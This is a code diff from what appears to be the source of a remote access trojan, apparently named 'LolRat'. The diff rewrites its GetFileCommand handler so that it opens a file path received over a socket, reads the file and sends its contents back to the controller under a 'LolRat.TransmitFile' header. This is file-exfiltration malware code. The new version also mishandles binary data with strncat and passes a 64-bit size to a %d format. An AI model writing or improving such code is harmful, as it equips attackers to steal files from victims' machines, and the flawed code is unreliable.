@@ -322,34 +322,36 @@ BOOL GetFileCommand(SOCKET* sock, PSTR str) {
 
 	if(!processHeap)
 		processHeap = GetProcessHeap();
-
-
-	//i know but diz is required
-	HANDLE* fileHandles = (HANDLE*) HeapAlloc(processHeap, 
-										HEAP_GENERATE_EXCEPTIONS |
-										HEAP_ZERO_MEMORY,
-										sizeof(HANDLE));
-
-	char* transmissionHeader = (char*) HeapAlloc(processHeap, 
-										HEAP_GENERATE_EXCEPTIONS |
-										HEAP_ZERO_MEMORY,
-										sizeof("\r\n\r\nAction.TransmitFiles\n"));
 	
-	memcpy(transmissionHeader, "\r\n\r\nAction.TransmitFiles\n", sizeof("\r\n\r\nAction.TransmitFiles\n"));
+	HANDLE file = CreateFileA(str,
+		GENERIC_READ,
+		FILE_SHARE_READ,
+		NULL,
+		OPEN_EXISTING,
+		FILE_ATTRIBUTE_NORMAL | FILE_FLAG_SEQUENTIAL_SCAN,
+		NULL);
 
-	strncat(transmissionHeader, "\n\0", 2);
-	WriteConnectionSize(sock, transmissionHeader, strlen(transmissionHeader) + 1);
-	HeapFree(processHeap, 0x0, transmissionHeader);
-	
-	HANDLE* tmp = fileHandles;
-	
-	while(*fileHandles++) {
-		TransmitFileConnection(sock, *fileHandles);
-		CloseHandle(*fileHandles);
+	if (file == INVALID_HANDLE_VALUE) {
+		WriteConnection(sock, "requested file was not found");
+		return TRUE;
 	}
 
-	fileHandles = tmp;
+	char* fileContent = ReadEntireFile(file, processHeap);
+	LARGE_INTEGER fileSize;
 
-	HeapFree(processHeap, 0x0, fileHandles);
+	GetFileSizeEx(file, &fileSize);
+
+	DWORD transmissionSize = sizeof("\r\nLolRat.TransmitFile\nsize:\n\n") + 19;
+	char* transmissionContent = HeapAlloc(processHeap,
+		HEAP_ZERO_MEMORY | HEAP_GENERATE_EXCEPTIONS, transmissionSize + fileSize.QuadPart);
+
+	snprintf(transmissionContent, transmissionSize, "\r\nLolRat.TransmitFile\nsize:%d\n\n", fileSize.QuadPart);
+	strncat(transmissionContent, fileContent, fileSize.QuadPart);
+
+	CloseHandle(file);
+	HeapFree(processHeap, 0, fileContent);
+
+	WriteConnection(sock, transmissionContent);
+	HeapFree(processHeap, 0, transmissionContent);
 	return TRUE;
 }
